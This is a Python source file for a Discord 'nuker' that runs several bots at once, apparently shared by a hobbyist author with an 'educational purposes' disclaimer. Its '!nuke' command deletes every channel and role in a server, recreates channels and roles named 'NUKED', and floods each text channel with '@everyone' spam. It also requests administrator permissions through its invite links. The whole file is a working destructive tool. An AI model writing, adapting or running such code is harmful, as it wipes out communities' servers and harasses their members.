# Disclaimer: This is only for entertainment and educational purposes.  
# I’m not responsible for what you do with it or any consequences.  
# Made by Vexi :3

import os

os.system("python -m pip install discord.py")
os.system("python -m pip install aiohttp")

import discord
from discord.ext import commands
import asyncio

class Config:
    Prefix = "!" # The prefix to use before commands (e.g. !nuke), you can also delete the prefix if you don't want one

    # Feel free to add as many bots as you would like
    Tokens = [
        "token1", # Your bot token from Discord Developer Portal
        "token2", # Your bot token from Discord Developer Portal
        "token3", # Your bot token from Discord Developer Portal 
        "token4", # Your bot token from Discord Developer Portal
        "token5", # Your bot token from Discord Developer Portal
    ]
    Ids = [
        1, # Your bot ID from Discord Developer Portal
        2, # Your bot ID from Discord Developer Portal
        3, # Your bot ID from Discord Developer Portal
        4, # Your bot ID from Discord Developer Portal
        5, # Your bot ID from Discord Developer Portal
    ]

    NUKEMESSAGE = "@everyone | **EZ GET NUKED**" # The message that will be spammed in channels
    NUKEMESSAGECOUNT = 10 # How many times to send the spam message in each channel
    NUKERENAME = "NUKED" # New name for the server
    NUKEROLENAME = "NUKED" # Base name for created roles
    NUKEROLECOUNT = 5 # How many roles to create
    NUKECHANNELNAME = "NUKED" # Base name for created text channels
    NUKECHANNELCOUNT = 5 # How many text channels to create
 

bots = []
config = Config()

def create_bot(index):
    bot = commands.Bot(command_prefix=config.Prefix, intents=discord.Intents.all())

    @bot.event
    async def on_ready():
        print(f"Logged in as bot")
    
    @bot.command()
    async def test(ctx):
        if index == 1:
            await ctx.send("hi")

    async def check_bots(guild):
        present_ids = [member.id for member in guild.members]
        return all(bot_id in present_ids for bot_id in config.Ids)

    async def invite(ctx):
        links = [
            f"https://discord.com/oauth2/authorize?client_id={cid}&permissions=8&scope=bot"
            for cid in config.Ids
        ]
        msg = "**You need to invite all bots first:**\n" + "\n".join(links)
        await ctx.send(msg)

    @bot.command()
    async def name(ctx):
        if index != 1:
            return

        guild = ctx.guild

        for i, b in enumerate(bots):
            member = guild.get_member(b.user.id)
            if member is None:
                continue

            if i == 0:
                new_name = "Main Bot"
            else:
                new_name = f"Bot {i}"

            try:
                await member.edit(nick=new_name)
            except Exception as e:
                print(f"Failed to rename: {e}")

        await ctx.send("Bots renamed.")

    @bot.command()
    async def nuke(ctx):
        guild = ctx.guild
        
        delete_tasks = []
        for channel in guild.channels:
            delete_tasks.append(channel.delete())
        
        for role in guild.roles:
            if role.name != "@everyone":
                delete_tasks.append(role.delete())
        
        await asyncio.gather(*delete_tasks, return_exceptions=True)
        
        channel_tasks = []
        role_tasks = []
        
        for i in range(config.NUKECHANNELCOUNT):
            if i % 2 == 0:
                channel_tasks.append(bots[0].get_guild(guild.id).create_text_channel(f"{config.NUKECHANNELNAME}-{i}"))
            else:
                channel_tasks.append(bots[1].get_guild(guild.id).create_text_channel(f"{config.NUKECHANNELNAME}-{i}"))
        
        for i in range(config.NUKEROLECOUNT):
            if i % 2 == 0:
                role_tasks.append(bots[2].get_guild(guild.id).create_role(name=f"{config.NUKEROLENAME}-{i}"))
            else:
                role_tasks.append(bots[3].get_guild(guild.id).create_role(name=f"{config.NUKEROLENAME}-{i}"))
        
        await asyncio.gather(*channel_tasks, *role_tasks, return_exceptions=True)
        
        spam_tasks = []
        bot_index = 0
        for channel in guild.text_channels:
            current_bot = bots[bot_index % len(bots)]
            for _ in range(config.NUKEMESSAGECOUNT):
                spam_tasks.append(current_bot.get_guild(guild.id).get_channel(channel.id).send(config.NUKEMESSAGE))
            bot_index += 1
        
        await asyncio.gather(*spam_tasks, return_exceptions=True)

    return bot

async def main():
    tasks = []

    for i, token in enumerate(config.Tokens):
        bot = create_bot(i + 1)
        bots.append(bot)
        tasks.append(bot.start(token))
    
    await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())